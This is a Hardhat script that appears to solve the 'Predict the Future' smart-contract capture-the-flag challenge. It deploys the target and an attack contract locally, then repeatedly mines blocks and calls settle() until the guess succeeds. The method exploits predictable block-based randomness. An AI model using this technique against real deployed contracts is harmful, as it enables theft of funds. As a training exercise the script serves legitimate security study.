const {ethers} = require("hardhat");
const hre = require("hardhat");

async function main() {
    const accounts = await ethers.getSigners();

    const baseContractFactory = await hre.ethers.getContractFactory('PredictTheFutureChallenge');
    const payment = hre.ethers.utils.parseEther('1');
    const payment1 = hre.ethers.utils.parseEther('1');
    const predictTheFutureContract = await baseContractFactory.connect(accounts[1]).deploy({value: payment});
    await predictTheFutureContract.deployed();

    const attackContractFactory = await hre.ethers.getContractFactory('AttackPredictTheFuture');
    const attackPredictTheFutureContract = await attackContractFactory.connect(accounts[1]).deploy(predictTheFutureContract.address.toString());
    await attackPredictTheFutureContract.deployed();


    let val = 0;
    let val1 = 0;
    await attackPredictTheFutureContract.connect(accounts[1]).attack({value: payment1, gasLimit: 100000,});
    let finalBlock = 0;
    let completed= false
    while (!completed) {

        try {
            val1++;
            await mineNBlocks(10);
            let success = await attackPredictTheFutureContract.connect(accounts[1]).settle();
            success = await success.wait();
            completed = await predictTheFutureContract.isComplete();
            console.log(success);
            if (success) {
                break;
            }
        } catch (e) {
            console.log(e);
            // break;
            // val++;
            val++;
        }

    }
    console.log(await predictTheFutureContract.isComplete());


}

async function mineNBlocks(n) {
    for (let index = 0; index < n; index++) {
        await hre.ethers.provider.send('evm_mine');
    }
}

main();